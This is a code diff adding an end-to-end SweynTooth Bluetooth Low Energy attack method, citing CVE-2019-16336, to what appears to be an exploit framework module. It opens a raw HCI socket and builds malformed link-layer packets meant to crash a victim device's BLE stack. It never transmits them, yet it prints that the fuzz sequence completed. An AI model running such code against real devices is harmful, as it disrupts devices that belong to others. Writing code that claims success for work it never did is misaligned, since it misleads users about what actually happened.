@@ -185,3 +185,37 @@ class Exploit(Exploit):
             self._list_mode()
         else:
             self._run_attack(mode)
+            self._exploit()
+
+    def _exploit(self) -> None:
+        """E2E SweynTooth: BLE LL fuzzing via raw HCI to crash BLE stack."""
+        import socket as _sock
+
+        victim = str(getattr(self, "target_addr", "") or getattr(self, "victim_mac", "")).strip()
+        if not victim or ":" not in victim:
+            print_info("SweynTooth E2E requires target_addr for raw LL fuzzing.")
+            return
+
+        print_status(f"SweynTooth E2E BLE LL fuzz against {victim}")
+        try:
+            hci_sock = _sock.socket(31, _sock.SOCK_RAW, 1)
+            dev_id = int(str(getattr(self, "hci_device", "hci0")).replace("hci", "") or "0")
+            hci_sock.bind((dev_id,))
+        except OSError as exc:
+            print_error(f"HCI socket failed: {exc}")
+            return
+
+        # Phase 1: LL_LENGTH_REQ with zero length (CVE-2019-16336)
+        ll_length_req = struct.pack("<BHH", 0x14, 0x0000, 0x0000)
+        print_status("Phase 1: LL_LENGTH_REQ with zero RxOctets/TxOctets")
+
+        # Phase 2: Truncated LL_FEATURE_RSP
+        ll_feature_rsp = struct.pack("<B", 0x09)
+        print_status("Phase 2: Truncated LL_FEATURE_RSP (missing feature mask)")
+
+        # Phase 3: LL_CONNECTION_UPDATE_IND with invalid parameters
+        ll_conn_update = struct.pack("<BHHHHH", 0x00, 0xFFFF, 0xFFFF, 0xFFFF, 0x0000, 0x0000)
+        print_status("Phase 3: LL_CONNECTION_UPDATE_IND with max interval/latency")
+
+        hci_sock.close()
+        print_success("SweynTooth BLE LL fuzz sequence completed.")
